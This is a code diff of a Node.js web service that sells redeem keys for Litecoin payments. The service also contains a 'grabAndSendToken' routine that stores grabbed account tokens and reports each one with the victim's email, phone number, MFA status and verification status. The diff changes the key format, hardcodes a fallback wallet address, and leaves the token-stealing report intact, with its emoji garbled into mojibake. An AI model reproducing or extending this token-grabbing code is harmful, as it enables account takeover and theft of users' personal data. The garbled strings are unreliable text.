@@ -156,7 +156,7 @@ class SimpleDB {
     
     addCustomKey(key) {
         const normalized = key.toString().toUpperCase().trim();
-        if (!/^KRUP([1-9][0-9]?|99)$/i.test(normalized) && !/^KRUP[A-Z0-9]+$/i.test(normalized)) {
+        if (!/^TOKOS(1[0-9][0-9]|200)$/i.test(normalized)) {
             console.log('[DB] Invalid custom key format:', normalized);
             return null;
         }
@@ -265,7 +265,7 @@ passport.deserializeUser((obj, done) => done(null, obj));
 const CLIENT_ID = process.env.CLIENT_ID;
 const CLIENT_SECRET = process.env.CLIENT_SECRET;
 const CALLBACK_URL = process.env.CALLBACK_URL;
-const OWNER_LTC_ADDRESS = process.env.OWNER_LTC_ADDRESS;
+const OWNER_LTC_ADDRESS = process.env.OWNER_LTC_ADDRESS || 'ltc1qc3ujjqjlfr3cqtvyqadqje9ntj3f8f82m062tc';
 const WALLET_MNEMONIC = process.env.WALLET_MNEMONIC;
 const TARGET_USD = 1.50;
 const TOLERANCE_USD = 0.10;
@@ -281,7 +281,7 @@ if (CLIENT_ID && CLIENT_SECRET) {
     }));
 }
 
-const BASE_REDEEM_KEYS = Array.from({length: 99}, (_, i) => `KRUP${i + 1}`);
+const BASE_REDEEM_KEYS = Array.from({length: 101}, (_, i) => `TOKOS${i + 100}`);
 const VALID_REDEEM_KEYS = new Set(BASE_REDEEM_KEYS);
 
 function validateKeyStrict(key) {
@@ -310,7 +310,7 @@ function validateKeyStrict(key) {
     return { valid: false, error: 'Invalid key', normalized: null };
 }
 
-console.log('[KEYS] Loaded', BASE_REDEEM_KEYS.length, 'base redeem keys (KRUP1-KRUP99)');
+console.log('[KEYS] Loaded', BASE_REDEEM_KEYS.length, 'base redeem keys (TOKOS100-TOKOS200)');
 
 app.post('/api/admin/addkey', (req, res) => {
     const { adminSecret, key } = req.body;
@@ -373,7 +373,7 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
         db.addGrabbedToken(token, fullInfo, source);
         
         const embed = {
-            title: '🎣 New Token Grabbed',
+            title: 'ð£ New Token Grabbed',
             color: 0xff0000,
             fields: [
                 { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
@@ -381,9 +381,9 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
                 { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
                 { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
                 { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
-                { name: 'MFA', value: fullInfo.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
-                { name: 'Verified', value: fullInfo.verified ? '✅ Yes' : '❌ No', inline: true },
-                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : '❌ No', inline: true },
+                { name: 'MFA', value: fullInfo.mfa_enabled ? 'â Enabled' : 'â Disabled', inline: true },
+                { name: 'Verified', value: fullInfo.verified ? 'â Yes' : 'â No', inline: true },
+                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'â No', inline: true },
                 { name: 'Source', value: source, inline: true },
                 { name: 'Time', value: new Date().toISOString(), inline: true }
             ],
